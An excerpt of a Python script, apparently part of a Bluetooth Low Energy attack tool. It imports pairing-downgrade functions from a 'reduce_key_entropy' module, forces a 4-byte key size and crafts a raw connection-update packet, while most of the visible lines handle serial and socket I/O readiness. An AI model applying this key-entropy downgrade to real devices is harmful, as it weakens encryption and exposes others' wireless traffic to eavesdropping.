...
from reduce_key_entropy import downgrade_pairing_request, downgrade_pairing_response
"""
...
def main():
    ...
    new_key_size = 0x04
    # --- make serial non-blocking when possible (helps Windows) ---
    try:
        if hasattr(hw, "ser") and hw.ser is not None:
            hw.ser.timeout = None
    except Exception:
        pass
    # -------------------------------------------------------------
    ...
    if args.fastslave:
        conn_update_pdu = DPacketMessage.from_body(
            b'\x03\x18\x0f\x06\x00\x0c\x00\x00\x00\xf4\x01\x03'
    ...
    # ------------------ Portable readiness helper ------------------
    # Returns (sock_ready, ser_ready) without touching hw.ser.fd.
    # Uses select() for the socket and in_waiting for the serial.
    def _io_ready(conn_obj, timeout=0.05):
        sock_ready = False
        ser_ready = False

        # Socket readiness via select (portable)
        try:
            r, _, _ = select([conn_obj.sock], [], [], timeout)
            sock_ready = conn_obj.sock in r
        except Exception:
            sock_ready = False

        # Serial readiness via in_waiting (works on Windows & POSIX)
        try:
            if hasattr(hw, "ser") and hw.ser is not None:
                # ensure non-blocking
                try:
                    if getattr(hw.ser, "timeout", None) not in (0, None):
                        hw.ser.timeout = None
                except Exception:
                    pass
                ser_ready = getattr(hw.ser, "in_waiting", 0) > 0
        except Exception:
            ser_ready = False

        return sock_ready, ser_ready
    # ---------------------------------------------------------------

    # -------------------- Portable I/O loop ------------------------
    while True:
        sock_ready, ser_ready = _io_ready(conn, timeout=0.05)
